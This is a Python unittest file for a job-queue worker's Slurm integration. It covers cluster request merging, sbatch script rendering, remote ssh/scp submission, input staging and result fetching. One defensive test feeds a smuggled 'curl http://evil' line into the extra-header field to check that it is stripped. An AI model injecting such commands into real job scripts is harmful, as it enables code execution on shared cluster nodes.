"""Cluster extras, Slurm script rendering, and GPU/array request merging."""
import os
import tempfile
import unittest
from types import SimpleNamespace
from unittest.mock import patch

from worker.cluster_models import Slurm
from worker.queue.cluster_request import (
    build_cluster_request,
    resolve_cluster_type,
    walltime_to_seconds,
)
from worker.tests.harness import setup_django

_DJANGO_OK, _DJANGO_ERR = setup_django()

if _DJANGO_OK:
    from worker.cluster_support import _with_extras, main as cluster_main
    from worker.queue.task import Task
else:
    _with_extras = None  # type: ignore
    cluster_main = None  # type: ignore
    Task = None  # type: ignore


class ClusterRequestTests(unittest.TestCase):
    def test_job_parameters_override_settings(self):
        job = SimpleNamespace(
            user_options={
                "ClusterGpus": "2",
                "ClusterPartition": "gpu",
                "ClusterTime": "4:00:00",
                "ClusterMem": "32G",
                "ClusterExclude": "node01",
                "ClusterExtra": "--constraint=volta",
            },
            db_obj=None,
            is_gpu_job=0,
        )
        step = SimpleNamespace(gpu_step=False)
        req = build_cluster_request(
            job,
            step,
            {"type": "Slurm", "gpus": "1", "partition": "cpu", "mem": "8G", "walltime": "1:00:00"},
            4,
            "8G",
            "8G",
            "cpu",
            "1:00:00",
        )
        extras = req["extras"]
        self.assertEqual(extras["gpus"], "2")
        self.assertEqual(extras["partition"], "gpu")
        self.assertEqual(req["walltime"], "4:00:00")
        self.assertEqual(req["mem"], "32G")
        self.assertEqual(extras["exclude"], "node01")
        self.assertEqual(extras["extra"], "--constraint=volta")

    def test_gpu_step_or_job_flag_requests_one_gpu(self):
        job = SimpleNamespace(
            user_options={},
            db_obj=SimpleNamespace(is_gpu_job=1, array_setting="", slave=None),
        )
        extras = build_cluster_request(job, SimpleNamespace(gpu_step=False), {}, 1, "1G", "1G", "", "")["extras"]
        self.assertEqual(extras["gpus"], "1")

        job = SimpleNamespace(user_options={}, db_obj=None, is_gpu_job=0)
        extras = build_cluster_request(job, SimpleNamespace(gpu_step=True), {}, 1, "1G", "1G", "", "")["extras"]
        self.assertEqual(extras["gpus"], "1")

    def test_array_setting_range_vs_sbatch_cli(self):
        job = SimpleNamespace(
            user_options={},
            db_obj=SimpleNamespace(array_setting="0-7", is_gpu_job=0, slave=None),
        )
        extras = build_cluster_request(job, SimpleNamespace(gpu_step=False), {}, 1, "", "", "", "")["extras"]
        self.assertEqual(extras["array"], "0-7")
        self.assertEqual(extras["sbatch_cli"], "")

        job = SimpleNamespace(
            user_options={},
            db_obj=SimpleNamespace(array_setting="--array=0-3 --nice=10", is_gpu_job=0, slave=None),
        )
        extras = build_cluster_request(job, SimpleNamespace(gpu_step=False), {}, 1, "", "", "", "")["extras"]
        self.assertEqual(extras["sbatch_cli"], "--array=0-3 --nice=10")

    def test_remote_from_slave(self):
        slave = SimpleNamespace(
            ssh_connection="cluster.example.edu",
            ssh_user="alice",
            ssh_key="/home/alice/.ssh/id_ed25519",
            cluster_manager_path="/opt/slurm/bin/",
        )
        job = SimpleNamespace(
            user_options={},
            db_obj=SimpleNamespace(slave=slave, is_gpu_job=0, array_setting=""),
        )
        extras = build_cluster_request(job, SimpleNamespace(gpu_step=False), {}, 1, "", "", "", "")["extras"]
        remote = extras["remote"]
        self.assertEqual(remote["host"], "cluster.example.edu")
        self.assertEqual(remote["user"], "alice")
        self.assertTrue(remote["scripts_dir"].endswith("bioqueue-scripts"))
        self.assertEqual(remote["bin_prefix"], "/opt/slurm/bin/")
        self.assertEqual(remote["result_root"], "/home/alice/workdir")
        self.assertEqual(extras["stage_in"], "0")

    def test_remote_request_carries_inputs_for_staging(self):
        job = SimpleNamespace(
            user_options={},
            job_input_files=["/data/input-a", "/data/input-b"],
            db_obj=SimpleNamespace(
                slave=SimpleNamespace(
                    ssh_connection="cluster.example.edu",
                    ssh_user="alice",
                    ssh_key="",
                    cluster_manager_path="",
                ),
                is_gpu_job=0,
                array_setting="",
            ),
        )
        extras = build_cluster_request(
            job, SimpleNamespace(gpu_step=False), {}, 1, "", "", "", ""
        )["extras"]
        self.assertEqual(
            extras["stage_inputs"], ["/data/input-a", "/data/input-b"]
        )

    def test_gpu_style_from_cluster_config(self):
        extras = build_cluster_request(
            SimpleNamespace(user_options={}, db_obj=None, is_gpu_job=0),
            SimpleNamespace(gpu_step=False),
            {"type": "Slurm", "gpu_style": "both"},
            1,
            "",
            "",
            "",
            "",
        )["extras"]
        self.assertEqual(extras["gpu_style"], "both")

    def test_extra_header_ignores_shell_payload(self):
        lines = Slurm.extra_header_lines("curl http://evil\n--gres=gpu:1\n#SBATCH --qos=high")
        self.assertNotIn("curl", lines)
        self.assertIn("#SBATCH --gres=gpu:1", lines)
        self.assertIn("#SBATCH --qos=high", lines)


class SlurmRenderTests(unittest.TestCase):
    def test_render_includes_gpu_array_and_body(self):
        script = Slurm.render_script(
            "echo fallback",
            9,
            0,
            cpu=8,
            mem="16G",
            queue="cpu",
            log_file="/tmp/job.out",
            wall_time="2:00:00",
            workspace="/data/jobs/9",
            extras={
                "body": "rsync -a src/ $SLURM_TMPDIR/\npython train.py\n",
                "gpus": "1",
                "partition": "gpu",
                "array": "0-3",
                "exclude": "node[01-02]",
                "prologue": "mkdir -p $SLURM_TMPDIR/work",
                "epilogue": "rsync -a $SLURM_TMPDIR/work/ $BQ_OUT/",
            },
        )
        self.assertIn("#SBATCH --job-name=9-0", script)
        self.assertIn("#SBATCH --cpus-per-task=8", script)
        self.assertIn("#SBATCH --mem 16G", script)
        self.assertIn("#SBATCH --time 2:00:00", script)
        self.assertIn("#SBATCH --partition gpu", script)
        self.assertIn("#SBATCH --gres=gpu:1", script)
        self.assertIn("#SBATCH --array 0-3", script)
        self.assertIn("#SBATCH --exclude node[01-02]", script)
        self.assertIn("python train.py", script)
        self.assertNotIn("echo fallback", script)
        self.assertIn("mkdir -p $SLURM_TMPDIR/work", script)

    def test_parse_sbatch_and_states(self):
        self.assertEqual(str(Slurm.parse_sbatch_job_id("Submitted batch job 44122")), "44122")
        self.assertEqual(Slurm.status_from_states(["PENDING"]), 2)
        self.assertEqual(Slurm.status_from_states(["RUNNING"]), 1)
        self.assertEqual(Slurm.status_from_states(["COMPLETED"]), 0)
        self.assertEqual(Slurm.status_from_states(["FAILED"]), -1)
        self.assertEqual(Slurm.status_from_states(["COMPLETED", "FAILED"]), -1)

    def test_submit_writes_script_and_parses_id(self):
        workspace = tempfile.mkdtemp(prefix="bq-slurm-")
        with patch.object(Slurm, "_run", return_value=(0, "Submitted batch job 99")) as run:
            cluster_id = Slurm.submit_job(
                "echo hi",
                3,
                1,
                cpu=2,
                mem="4G",
                workspace=workspace,
                extras={"body": "echo hi\n"},
            )
        self.assertEqual(str(cluster_id), "99")
        script_path = os.path.join(workspace, "3-1.sbatch")
        self.assertTrue(os.path.exists(script_path))
        argv = run.call_args[0][0]
        self.assertEqual(os.path.basename(argv[0]), "sbatch")
        self.assertIn("--requeue", argv)
        self.assertEqual(argv[-1], script_path)

    def test_remote_submit_uses_ssh_scp(self):
        workspace = tempfile.mkdtemp(prefix="bq-slurm-")
        remote = {
            "host": "hpc",
            "user": "bob",
            "key": "/tmp/key",
            "scripts_dir": "/tmp/scripts",
            "bin_prefix": "/opt/slurm/bin/",
        }
        outputs = [
            (0, ""),
            (0, ""),
            (0, "Submitted batch job 77"),
        ]

        def fake_run(argv, timeout=60, cwd=None, retries=3):
            return outputs.pop(0)

        with patch.object(Slurm, "_run", side_effect=fake_run) as run:
            cluster_id = Slurm.submit_job(
                "echo", 1, 0, workspace=workspace, extras={"remote": remote, "body": "echo"}
            )
        self.assertEqual(str(cluster_id), "77")
        ssh_mkdir, scp, ssh_sbatch = [call[0][0] for call in run.call_args_list]
        self.assertEqual(ssh_mkdir[0], "ssh")
        self.assertIn("bob@hpc", ssh_mkdir)
        self.assertEqual(scp[0], "scp")
        self.assertTrue(any(str(part).startswith("bob@hpc:") for part in scp))
        self.assertEqual(ssh_sbatch[0], "ssh")
        self.assertTrue(any("sbatch" in str(part) for part in ssh_sbatch))


class ProtocolGpuStepTests(unittest.TestCase):
    def setUp(self):
        if not _DJANGO_OK:
            self.skipTest("worker django deps unavailable: %s" % _DJANGO_ERR)

    def test_customize_passes_gpu_step(self):
        from worker.queue.protocol import Protocol

        db_step = SimpleNamespace(
            software="echo",
            parameter="hi",
            specify_output="",
            hash="abc",
            env=None,
            version_check="",
            force_local=0,
            gpu_step=1,
        )
        proto = Protocol.__new__(Protocol)
        proto._settings = {"env": {"workspace": "/tmp", "cpu": "2"}, "cluster": {"type": ""}}
        proto.raw_steps = [db_step]
        steps = proto.customize_steps_by_user_dir(None, None)
        self.assertTrue(steps[0].gpu_step)


class RunStepClusterExtrasTests(unittest.TestCase):
    def setUp(self):
        if not _DJANGO_OK:
            self.skipTest("worker django deps unavailable: %s" % _DJANGO_ERR)

    def test_run_step_cluster_passes_extras(self):
        from worker.tests.test_scheduler import FakeJob, FakeStep, _queue

        queue = _queue(
            settings={
                "cluster": {
                    "type": "Slurm",
                    "cpu": "8",
                    "mem": "8G",
                    "vrt": "8G",
                    "new_queue": "cpu",
                    "walltime": "01:00:00",
                    "gpus": "1",
                },
                "env": {"max_job": 4},
            }
        )
        step = FakeStep(100, None, None)
        step.command = ["echo", "hi"]
        step.gpu_step = True
        job = FakeJob(7, 100, None, None)
        job.steps = [step]
        job.run_folder = "/tmp"
        job.user_options = {"ClusterPartition": "gpu"}
        with patch("worker.queue.job_queue.cluster_support") as fake_cluster:
            fake_cluster.main.return_value = 0
            queue._run_step_cluster(job, "/tmp/out", "/tmp/err")
        extras = fake_cluster.main.call_args[1]["extras"]
        self.assertEqual(extras["partition"], "gpu")
        self.assertEqual(extras["gpus"], "1")
        self.assertEqual(extras["body"], "echo hi")
        self.assertEqual(extras["fetch_dest"], "/tmp")
        self.assertEqual(extras["fetch_log"], "/tmp/out")
        self.assertEqual(extras["fetch_err"], "/tmp/err")


class SpecialParameterParseTests(unittest.TestCase):
    def setUp(self):
        if Task is None:
            self.skipTest("worker django deps unavailable: %s" % _DJANGO_ERR)

    def test_single_key_without_semicolon(self):
        self.assertEqual(Task.build_special_parameter_dict("ClusterGpus=1"), {"ClusterGpus": "1"})

    def test_strips_keys_and_values(self):
        parsed = Task.build_special_parameter_dict(" ClusterGpus = 2 ; ClusterMem = 8G ")
        self.assertEqual(parsed["ClusterGpus"], "2")
        self.assertEqual(parsed["ClusterMem"], "8G")


class ClusterTypeAndWalltimeTests(unittest.TestCase):
    def test_slave_cluster_manager_defaults_to_slurm(self):
        job = SimpleNamespace(db_obj=SimpleNamespace(slave=SimpleNamespace(cluster_manager=1)))
        self.assertEqual(resolve_cluster_type({}, job), "Slurm")
        self.assertEqual(resolve_cluster_type({"type": "LSF"}, job), "LSF")
        self.assertEqual(resolve_cluster_type({"type": ""}, SimpleNamespace(db_obj=None)), "")

    def test_walltime_to_seconds(self):
        self.assertEqual(walltime_to_seconds("01:00:00"), 3600)
        self.assertEqual(walltime_to_seconds("1-02:03:04"), 93784)
        self.assertEqual(walltime_to_seconds("30"), 1800)
        self.assertEqual(walltime_to_seconds(""), 0)


class SlurmStatusAndFetchTests(unittest.TestCase):
    def test_stage_in_rewrites_host_paths_to_cluster_paths(self):
        workspace = tempfile.mkdtemp(prefix="bq-stage-workspace-")
        input_dir = tempfile.mkdtemp(prefix="bq-stage-input-")
        extras = {
            "stage_in": "1",
            "stage_inputs": [input_dir],
            "body": 'cd "%s"\nuse "%s"\n' % (workspace, input_dir),
            "remote": {
                "host": "h",
                "user": "alice",
                "scripts_dir": "/home/alice/bioqueue-scripts",
            },
        }
        with patch.object(Slurm, "_rsync_to_remote", return_value=(0, "")) as sync:
            ok = Slurm._stage_workspace(workspace, 77, extras)
        self.assertTrue(ok)
        remote_workspace = (
            "/home/alice/bioqueue-scripts/jobs/77/workspace"
        )
        self.assertEqual(extras["remote"]["chdir"], remote_workspace)
        self.assertEqual(extras["remote"]["result_dir"], remote_workspace)
        self.assertNotIn(workspace, extras["body"])
        self.assertNotIn(input_dir, extras["body"])
        self.assertEqual(sync.call_count, 2)

    def test_stage_in_rewrites_trailing_slash_input_paths(self):
        workspace = tempfile.mkdtemp(prefix="bq-stage-workspace-")
        input_dir = tempfile.mkdtemp(prefix="bq-stage-input-")
        input_with_slash = input_dir + os.sep
        extras = {
            "stage_in": "1",
            "stage_inputs": [input_with_slash],
            "body": 'data_dir="%s"\n' % input_with_slash,
            "remote": {
                "host": "h",
                "user": "alice",
                "scripts_dir": "/home/alice/bioqueue-scripts",
            },
        }
        with patch.object(Slurm, "_rsync_to_remote", return_value=(0, "")) as sync:
            ok = Slurm._stage_workspace(workspace, 88, extras)
        self.assertTrue(ok)
        self.assertNotIn(input_dir, extras["body"])
        self.assertIn("/home/alice/bioqueue-scripts/jobs/88/inputs/1_", extras["body"])
        self.assertEqual(sync.call_count, 2)

    def test_stage_in_maps_inputs_under_workspace_without_extra_rsync(self):
        workspace = tempfile.mkdtemp(prefix="bq-stage-workspace-")
        dataset = os.path.join(workspace, "dataset")
        os.mkdir(dataset)
        extras = {
            "stage_in": "1",
            "stage_inputs": [workspace + os.sep, dataset],
            "body": 'root="%s"\nsub="%s"\n' % (workspace + os.sep, dataset),
            "remote": {
                "host": "h",
                "user": "alice",
                "scripts_dir": "/home/alice/bioqueue-scripts",
            },
        }
        remote_workspace = "/home/alice/bioqueue-scripts/jobs/99/workspace"
        with patch.object(Slurm, "_rsync_to_remote", return_value=(0, "")) as sync:
            ok = Slurm._stage_workspace(workspace, 99, extras)
        self.assertTrue(ok)
        self.assertEqual(sync.call_count, 1)
        self.assertIn(remote_workspace, extras["body"])
        self.assertIn("%s/dataset" % remote_workspace, extras["body"])

    def test_stage_in_skips_missing_local_paths(self):
        workspace = tempfile.mkdtemp(prefix="bq-stage-workspace-")
        missing = "/cluster/nfs/dataset-not-on-worker"
        extras = {
            "stage_in": "1",
            "stage_inputs": [missing],
            "body": 'data_dir="%s"\n' % missing,
            "remote": {
                "host": "h",
                "user": "alice",
                "scripts_dir": "/home/alice/bioqueue-scripts",
            },
        }
        with patch.object(Slurm, "_rsync_to_remote", return_value=(0, "")):
            ok = Slurm._stage_workspace(workspace, 100, extras)
        self.assertTrue(ok)
        self.assertIn(missing, extras["body"])

    def test_stage_in_missing_under_workspace_does_not_fail(self):
        workspace = tempfile.mkdtemp(prefix="bq-stage-workspace-")
        missing = os.path.join(workspace, "missing-dataset")
        extras = {
            "stage_in": "1",
            "stage_inputs": [missing],
            "body": 'data_dir="%s"\n' % missing,
            "remote": {
                "host": "h",
                "user": "alice",
                "scripts_dir": "/home/alice/bioqueue-scripts",
            },
        }
        with patch.object(Slurm, "_rsync_to_remote", return_value=(0, "")):
            ok = Slurm._stage_workspace(workspace, 101, extras)
        self.assertTrue(ok)

    def test_gpu_style_gpus_and_both(self):
        gpus_only = Slurm.render_script(
            "echo", 1, 0, workspace="/tmp/ws", extras={"gpus": "1", "gpu_style": "gpus"}
        )
        self.assertIn("#SBATCH --gpus=1", gpus_only)
        self.assertNotIn("--gres=gpu:1", gpus_only)
        both = Slurm.render_script(
            "echo", 1, 0, workspace="/tmp/ws", extras={"gpus": "2", "gpu_style": "both"}
        )
        self.assertIn("#SBATCH --gres=gpu:2", both)
        self.assertIn("#SBATCH --gpus=2", both)

    def test_local_logs_live_under_workspace(self):
        script = Slurm.render_script(
            "echo", 9, 0, log_file="/tmp/job.out", workspace="/data/jobs/9", extras={}
        )
        self.assertIn("/data/jobs/9/9-0.out", script)
        self.assertNotIn("/tmp/job.out", script)

    def test_invalid_scontrol_uses_sacct_completed(self):
        outputs = [
            (1, "slurm_load_jobs error: Invalid job id specified"),
            (0, "325802|COMPLETED|0:0"),
        ]

        def fake_run(argv, timeout=60, cwd=None, retries=3):
            return outputs.pop(0)

        with patch.object(Slurm, "_run", side_effect=fake_run):
            self.assertEqual(Slurm.query_job_status("325802"), 0)

    def test_invalid_scontrol_uses_sacct_failed(self):
        outputs = [
            (1, "Invalid job id specified"),
            (0, "325802|FAILED|1:0"),
        ]

        def fake_run(argv, timeout=60, cwd=None, retries=3):
            return outputs.pop(0)

        with patch.object(Slurm, "_run", side_effect=fake_run):
            self.assertEqual(Slurm.query_job_status("325802"), -1)

    def test_invalid_scontrol_empty_sacct_is_unknown(self):
        outputs = [
            (1, "Invalid job id specified"),
            (0, ""),
        ]

        def fake_run(argv, timeout=60, cwd=None, retries=3):
            return outputs.pop(0)

        with patch.object(Slurm, "_run", side_effect=fake_run):
            self.assertEqual(Slurm.query_job_status("325802"), Slurm.STATUS_UNKNOWN)

    def test_sacct_usage_uses_batch_cpu_and_peak_memory(self):
        output = "\n".join(
            [
                "42|COMPLETED|120|00:03:00|4||",
                "42.batch|COMPLETED|120|00:03:00|4|4194304K|8388608K",
                "42.extern|COMPLETED|120|00:00:01|4|128K|256K",
            ]
        )
        usage = Slurm.parse_sacct_usage(output, "42")
        self.assertEqual(usage["cpu"], 150.0)
        self.assertEqual(usage["mem"], 4 * 1024**3)
        self.assertEqual(usage["vrt_mem"], 8 * 1024**3)

    def test_sacct_usage_handles_arrays_per_task(self):
        output = "\n".join(
            [
                "42_0.batch|COMPLETED|60|00:02:00|2|2G|3G",
                "42_1.batch|COMPLETED|60|00:01:30|2|5G|7G",
            ]
        )
        usage = Slurm.parse_sacct_usage(output, "42")
        self.assertEqual(usage["cpu"], 200.0)
        self.assertEqual(usage["mem"], 5 * 1024**3)
        self.assertEqual(usage["vrt_mem"], 7 * 1024**3)

    def test_query_job_usage_uses_remote_sacct(self):
        output = "42.batch|COMPLETED|60|00:01:00|2|1G|2G"
        with patch.object(Slurm, "_run", return_value=(0, output)) as run:
            usage = Slurm.query_job_usage(
                "42", extras={"remote": {"host": "h", "user": "alice"}}
            )
        self.assertEqual(usage["cpu"], 100.0)
        argv = run.call_args[0][0]
        self.assertEqual(argv[0], "ssh")
        self.assertTrue(any("sacct" in str(part) for part in argv))
        self.assertFalse(any("ml_container.py" in str(part) for part in argv))

    def test_scontrol_ssh_error_is_unknown(self):
        with patch.object(Slurm, "_run", return_value=(255, "ssh: connect failed")):
            self.assertEqual(
                Slurm.query_job_status("1", extras={"remote": {"host": "h"}}),
                Slurm.STATUS_UNKNOWN,
            )

    def test_run_retries_oserror_then_succeeds(self):
        n = {"i": 0}

        def fake_sub(*args, **kwargs):
            n["i"] += 1
            if n["i"] < 3:
                raise OSError("blip")
            return SimpleNamespace(returncode=0, stdout=b"ok")

        with patch("worker.cluster_models.Slurm.subprocess.run", side_effect=fake_sub):
            with patch("worker.cluster_models.Slurm.time.sleep"):
                rc, out = Slurm._run(["true"])
        self.assertEqual(rc, 0)
        self.assertEqual(out, "ok")
        self.assertEqual(n["i"], 3)

    def test_run_does_not_retry_invalid_job(self):
        n = {"i": 0}

        def fake_sub(*args, **kwargs):
            n["i"] += 1
            return SimpleNamespace(returncode=1, stdout=b"Invalid job id specified")

        with patch("worker.cluster_models.Slurm.subprocess.run", side_effect=fake_sub):
            rc, out = Slurm._run(["scontrol", "show", "job", "1"])
        self.assertEqual(rc, 1)
        self.assertEqual(n["i"], 1)
        self.assertIn("Invalid job id", out)

    def test_fetch_results_returns_false_when_rsync_fails(self):
        dest = tempfile.mkdtemp(prefix="bq-fetch-")
        with patch.object(Slurm, "_run", return_value=(1, "rsync: connection reset")):
            ok = Slurm.fetch_results(
                9,
                extras={
                    "remote": {"host": "h", "result_root": "/work"},
                    "fetch_dest": dest,
                },
            )
        self.assertFalse(ok)

    def test_fetch_defaults_result_root_from_ssh_user(self):
        dest = tempfile.mkdtemp(prefix="bq-fetch-")

        def fake_run(argv, timeout=60, cwd=None, retries=3):
            if argv and argv[0] == "ssh":
                return (0, "/home/ly349/workdir/476387\n")
            return (0, "")

        with patch.object(Slurm, "_run", side_effect=fake_run) as run:
            ok = Slurm.fetch_results(
                476387,
                extras={
                    "remote": {"host": "h", "user": "ly349"},
                    "fetch_dest": dest,
                },
            )
        self.assertTrue(ok)
        rsync_argv = [c[0][0] for c in run.call_args_list if c[0][0] and c[0][0][0] == "rsync"][0]
        self.assertTrue(any("/home/ly349/workdir/476387/" in str(part) for part in rsync_argv))

    def test_fetch_rsyncs_array_dirs_from_remote_ls(self):
        dest = tempfile.mkdtemp(prefix="bq-fetch-")

        def fake_run(argv, timeout=60, cwd=None, retries=3):
            joined = " ".join(str(p) for p in argv)
            if argv and argv[0] == "rsync":
                return (0, "")
            if "find" in joined and "/work" in joined:
                return (0, "/work/9_0\n/work/9_1\n")
            return (0, "")

        with patch.object(Slurm, "_run", side_effect=fake_run) as run:
            ok = Slurm.fetch_results(
                9,
                extras={
                    "remote": {"host": "h", "result_root": "/work"},
                    "fetch_dest": dest,
                },
            )
        self.assertTrue(ok)
        rsync_calls = [c[0][0] for c in run.call_args_list if c[0][0] and c[0][0][0] == "rsync"]
        self.assertEqual(len(rsync_calls), 2)
        self.assertTrue(any("9_0/" in str(part) for part in rsync_calls[0]))
        self.assertTrue(any("9_1/" in str(part) for part in rsync_calls[1]))

    def test_fetch_results_also_pulls_legacy_workdir_when_result_dir_is_set(self):
        dest = tempfile.mkdtemp(prefix="bq-fetch-both-")

        def fake_run(argv, timeout=60, cwd=None, retries=3):
            joined = " ".join(str(p) for p in argv)
            if argv and argv[0] == "rsync":
                return (0, "")
            if "find" in joined and "/home/u/workdir" in joined:
                return (0, "/home/u/workdir/99\n")
            return (0, "")

        with patch.object(Slurm, "_run", side_effect=fake_run) as run:
            ok = Slurm.fetch_results(
                99,
                extras={
                    "remote": {
                        "host": "h",
                        "user": "u",
                        "result_dir": "/home/u/bioqueue-scripts/jobs/7/workspace",
                        "result_root": "/home/u/workdir",
                    },
                    "fetch_dest": dest,
                    "stage_in": "1",
                },
            )
        self.assertTrue(ok)
        rsync_calls = [c[0][0] for c in run.call_args_list if c[0][0] and c[0][0][0] == "rsync"]
        remote_srcs = [str(part) for argv in rsync_calls for part in argv if ":" in str(part)]
        self.assertTrue(
            any("bioqueue-scripts/jobs/7/workspace/" in src for src in remote_srcs)
        )
        self.assertTrue(any("/home/u/workdir/99/" in src for src in remote_srcs))

    def test_array_remote_script_uses_per_task_workdir(self):
        extras = {
            "array": "0-3",
            "body": "echo hi\n",
            "remote": {
                "host": "h",
                "user": "alice",
                "result_root": "/home/alice/workdir",
                "scripts_dir": "/home/alice/bioqueue-scripts",
                "result_dir": "/home/alice/bioqueue-scripts/jobs/9/workspace",
                "chdir": "/home/alice/bioqueue-scripts/jobs/9/workspace",
            },
        }
        script = Slurm.render_script(
            "echo fallback",
            9,
            0,
            cpu=1,
            workspace="/tmp/ws",
            extras=extras,
        )
        self.assertIn('mkdir -p /home/alice/workdir/"$SLURM_JOB_ID"', script)
        self.assertIn('cd /home/alice/workdir/"$SLURM_JOB_ID"', script)
        self.assertNotIn("#SBATCH --chdir /home/alice/bioqueue-scripts/jobs/9/workspace", script)
        self.assertIsNone(extras["remote"].get("result_dir"))

    def test_parse_ls_dirs_accepts_array_suffixes(self):
        dirs = Slurm._parse_ls_dirs(
            "/home/u/workdir/476684_0\n/home/u/workdir/476684_1\n",
            "/home/u/workdir",
            "476684",
        )
        self.assertEqual(
            dirs,
            ["/home/u/workdir/476684_0/", "/home/u/workdir/476684_1/"],
        )


class ClusterSupportHardeningTests(unittest.TestCase):
    def setUp(self):
        if cluster_main is None:
            self.skipTest("worker django deps unavailable: %s" % _DJANGO_ERR)

    def test_with_extras_does_not_swallow_typeerror(self):
        def boom(*args, extras=None):
            raise TypeError("unexpected keyword inside submit")

        with self.assertRaises(TypeError):
            _with_extras(boom, "cmd", extras={"gpus": "1"})

    def test_fetch_logs_appends_remote_slurm_files(self):
        dest = tempfile.mkdtemp(prefix="bq-logs-")
        log_path = os.path.join(dest, "job.log")
        err_path = os.path.join(dest, "job.err")
        outputs = {
            "find": (0, "/home/u/scripts/7-0.out\n/home/u/scripts/7-0.err\n"),
            "scp_out": (0, ""),
            "scp_err": (0, ""),
        }

        def fake_run(argv, timeout=60, cwd=None, retries=3):
            if argv and argv[0] == "ssh":
                return outputs["find"]
            if argv and argv[0] == "scp":
                remote = argv[-2]
                local = argv[-1]
                payload = b"stdout body" if remote.endswith(".out") else b"stderr body"
                with open(local, "wb") as handle:
                    handle.write(payload)
                return (0, "")
            return (1, "unexpected")

        with patch.object(Slurm, "_run", side_effect=fake_run):
            ok = Slurm.fetch_logs(
                7,
                extras={
                    "remote": {
                        "host": "h",
                        "user": "u",
                        "stdout_path": "/home/u/scripts/7-0.out",
                        "stderr_path": "/home/u/scripts/7-0.err",
                    },
                    "fetch_log": log_path,
                    "fetch_err": err_path,
                },
            )
        self.assertTrue(ok)
        with open(log_path, "rb") as handle:
            self.assertIn(b"stdout body", handle.read())
        with open(err_path, "rb") as handle:
            self.assertIn(b"stderr body", handle.read())

    def test_learning_runs_original_body_and_stores_scheduler_usage(self):
        captured = {}

        def submit(*args, extras=None):
            captured["body"] = extras.get("body")
            return "12"

        training = SimpleNamespace(
            update_cpu_mem=lambda cpu, mem, vrt: captured.update(
                usage=(cpu, mem, vrt)
            )
        )
        fake_model = SimpleNamespace(
            submit_job=submit,
            query_job_status=lambda *a, extras=None: 0,
            query_job_usage=lambda *a, extras=None: {
                "cpu": 175.0,
                "mem": 4 * 1024**3,
                "vrt_mem": 8 * 1024**3,
            },
            fetch_results=lambda *a, extras=None: True,
            cancel_job=lambda *a, extras=None: 1,
        )
        workspace = tempfile.mkdtemp(prefix="bq-learn-")
        extras = {"body": "echo user-script"}
        with patch("worker.cluster_support.dispatch", return_value=fake_model), patch(
            "worker.cluster_support.Training.objects.get", return_value=training
        ), patch("worker.cluster_support._sync_job_status", return_value=True):
            rc = cluster_main(
                "Slurm",
                "echo hi",
                987654321,
                0,
                1,
                "1G",
                "1G",
                "q",
                workspace,
                os.path.join(workspace, "job.log"),
                learning=1,
                trace_id=42,
                extras=extras,
            )
        self.assertEqual(rc, 0)
        self.assertEqual(captured["body"], "echo user-script")
        self.assertEqual(
            captured["usage"], (175.0, 4 * 1024**3, 8 * 1024**3)
        )

    def test_fetch_false_fails_the_step(self):
        fake_model = SimpleNamespace(
            submit_job=lambda *a, extras=None: "12",
            query_job_status=lambda *a, extras=None: 0,
            fetch_results=lambda *a, extras=None: False,
            cancel_job=lambda *a, extras=None: 1,
        )
        workspace = tempfile.mkdtemp(prefix="bq-fetchfail-")
        with patch("worker.cluster_support.dispatch", return_value=fake_model), patch(
            "worker.cluster_support._sync_job_status", return_value=True
        ), patch("worker.cluster_support.if_terminate", return_value=False):
            rc = cluster_main(
                "Slurm",
                "echo hi",
                987654321,
                0,
                1,
                "1G",
                "1G",
                "q",
                workspace,
                os.path.join(workspace, "job.log"),
                extras={"body": "echo hi"},
            )
        self.assertEqual(rc, 1)

    def test_remote_non_slurm_is_refused(self):
        workspace = tempfile.mkdtemp(prefix="bq-remote-lsf-")
        fake_model = SimpleNamespace(
            submit_job=lambda *a, extras=None: "12",
            query_job_status=lambda *a, extras=None: 0,
            fetch_results=lambda *a, extras=None: True,
            cancel_job=lambda *a, extras=None: 1,
        )
        with patch("worker.cluster_support.dispatch", return_value=fake_model):
            rc = cluster_main(
                "LSF",
                "echo hi",
                1,
                0,
                1,
                "1G",
                "1G",
                "q",
                workspace,
                os.path.join(workspace, "job.log"),
                extras={"remote": {"host": "hpc"}, "body": "echo hi"},
            )
        self.assertEqual(rc, 1)

    def test_submit_uses_extras_body_as_protocol(self):
        captured = {}

        def submit(protocol, *args, extras=None):
            captured["protocol"] = protocol
            return "12"

        fake_model = SimpleNamespace(
            submit_job=submit,
            query_job_status=lambda *a, extras=None: 0,
            fetch_results=lambda *a, extras=None: True,
            cancel_job=lambda *a, extras=None: 1,
        )
        workspace = tempfile.mkdtemp(prefix="bq-body-")
        with patch("worker.cluster_support.dispatch", return_value=fake_model), patch(
            "worker.cluster_support._sync_job_status", return_value=True
        ):
            rc = cluster_main(
                "LSF",
                "bash /tmp/.bq_step_0.sh",
                2,
                0,
                1,
                "1G",
                "1G",
                "q",
                workspace,
                os.path.join(workspace, "job.log"),
                extras={"body": "echo from-body\n"},
            )
        self.assertEqual(rc, 0)
        self.assertEqual(captured["protocol"], "echo from-body\n")

    def test_unknown_status_streak_fails(self):
        fake_model = SimpleNamespace(
            submit_job=lambda *a, extras=None: "12",
            query_job_status=lambda *a, extras=None: Slurm.STATUS_UNKNOWN,
            fetch_results=lambda *a, extras=None: True,
            cancel_job=lambda *a, extras=None: 1,
        )
        workspace = tempfile.mkdtemp(prefix="bq-unknown-")
        with patch("worker.cluster_support.dispatch", return_value=fake_model), patch(
            "worker.cluster_support._sync_job_status", return_value=True
        ), patch("worker.cluster_support.time.sleep"), patch(
            "worker.cluster_support.if_terminate", return_value=False
        ):
            rc = cluster_main(
                "Slurm",
                "echo hi",
                987654321,
                0,
                1,
                "1G",
                "1G",
                "q",
                workspace,
                os.path.join(workspace, "job.log"),
                extras={"body": "echo hi", "poll_max_seconds": "60"},
            )
        self.assertEqual(rc, 1)
